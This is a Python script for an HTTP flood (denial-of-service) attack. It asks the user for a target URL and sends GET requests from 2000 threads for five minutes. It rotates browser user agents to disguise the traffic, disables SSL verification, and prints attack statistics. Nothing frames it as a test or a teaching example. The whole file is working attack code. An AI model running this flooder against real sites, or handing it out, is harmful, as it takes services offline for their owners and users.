import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# Colors
GREEN = '\033[1;32m'
RED = '\033[1;31m'
YELLOW = '\033[1;33m'
CYAN = '\033[1;36m'
MAGENTA = '\033[1;35m'
RESET = '\033[0m'

# Global variables for performance
SUCCESS_COUNT = 0
ERROR_COUNT = 0
TIMEOUT_COUNT = 0
REQUEST_COUNT = 0

# User agents rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
]

def send_request(url, request_id):
    global SUCCESS_COUNT, ERROR_COUNT, TIMEOUT_COUNT, REQUEST_COUNT
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    
    try:
        # Very aggressive timeout for maximum speed
        response = requests.get(
            url, 
            headers=headers, 
            timeout=2,  # Very short timeout
            verify=False,  # Disable SSL verification for speed
            allow_redirects=False  # No redirects for speed
        )
        
        REQUEST_COUNT += 1
        
        if response.status_code == 200:
            SUCCESS_COUNT += 1
            print(f"{GREEN}[✓] SUCCESS | ID: {request_id:06d} | Status: {response.status_code} | URL: {url}{RESET}")
        elif response.status_code in [403, 404, 500, 502, 503]:
            ERROR_COUNT += 1
            print(f"{RED}[✗] ERROR | ID: {request_id:06d} | Status: {response.status_code} | URL: {url}{RESET}")
        else:
            ERROR_COUNT += 1
            print(f"{RED}[!] FAILED | ID: {request_id:06d} | Status: {response.status_code} | URL: {url}{RESET}")
    
    except requests.exceptions.ConnectionError:
        TIMEOUT_COUNT += 1
        REQUEST_COUNT += 1
        print(f"{YELLOW}[⌛] TIMEOUT | ID: {request_id:06d} | Connection failed | URL: {url}{RESET}")
    
    except requests.exceptions.Timeout:
        TIMEOUT_COUNT += 1
        REQUEST_COUNT += 1
        print(f"{YELLOW}[⌛] TIMEOUT | ID: {request_id:06d} | Request timeout | URL: {url}{RESET}")
    
    except Exception as e:
        ERROR_COUNT += 1
        REQUEST_COUNT += 1
        print(f"{RED}[⚠] EXCEPTION | ID: {request_id:06d} | {str(e)[:50]} | URL: {url}{RESET}")
    
    return None

def flood_attack(url, max_threads=1000, duration=60):
    """Ultra fast flooding attack"""
    print(f"{CYAN}{'='*60}{RESET}")
    print(f"{MAGENTA}[+] Starting ULTRA-FAST FLOOD ATTACK{RESET}")
    print(f"{CYAN}[+] Target: {url}{RESET}")
    print(f"{CYAN}[+] Threads: {max_threads}{RESET}")
    print(f"{CYAN}[+] Duration: {duration} seconds{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")
    
    start_time = time.time()
    request_id = 0
    
    # Disable SSL warnings for speed
    requests.packages.urllib3.disable_warnings()
    
    # Use ThreadPoolExecutor for maximum performance
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        
        while time.time() - start_time < duration:
            # Submit multiple requests at once
            for _ in range(min(100, max_threads)):  # Batch submit
                if time.time() - start_time >= duration:
                    break
                    
                request_id += 1
                future = executor.submit(send_request, url, request_id)
                futures.append(future)
            
            # Small delay to prevent overwhelming the executor
            time.sleep(0.001)
        
        # Wait for all futures to complete
        for future in as_completed(futures):
            try:
                future.result(timeout=1)
            except:
                pass
    
    return start_time

def print_stats(start_time):
    """Print attack statistics"""
    elapsed = time.time() - start_time
    
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{MAGENTA}[+] ATTACK COMPLETED{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")
    print(f"{GREEN}[+] Successful Requests: {SUCCESS_COUNT}{RESET}")
    print(f"{RED}[+] Error Requests: {ERROR_COUNT}{RESET}")
    print(f"{YELLOW}[+] Timeout/Offline: {TIMEOUT_COUNT}{RESET}")
    print(f"{CYAN}[+] Total Requests: {REQUEST_COUNT}{RESET}")
    print(f"{CYAN}[+] Attack Duration: {elapsed:.2f} seconds{RESET}")
    print(f"{MAGENTA}[+] Requests/Second: {REQUEST_COUNT/elapsed if elapsed > 0 else 0:.2f}{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")

if __name__ == "__main__":
    # Get target URL
    url = input(f"{CYAN}[?] Enter target URL: {RESET}").strip()
    
    if not url:
        url = "http://example.com"
        print(f"{YELLOW}[!] Using default: {url}{RESET}")
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # Ultra aggressive settings
    MAX_THREADS = 2000  # Extreme threading
    ATTACK_DURATION = 300  # 5 minutes attack
    
    print(f"\n{YELLOW}[!] WARNING: This is an EXTREME performance configuration{RESET}")
    print(f"{YELLOW}[!] Threads: {MAX_THREADS} | Duration: {ATTACK_DURATION}s{RESET}")
    
    # Start the attack
    try:
        start_time = flood_attack(url, MAX_THREADS, ATTACK_DURATION)
        print_stats(start_time)
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Attack interrupted by user{RESET}")
        print_stats(time.time() - ATTACK_DURATION)
    except Exception as e:
        print(f"\n{RED}[!] Fatal error: {e}{RESET}")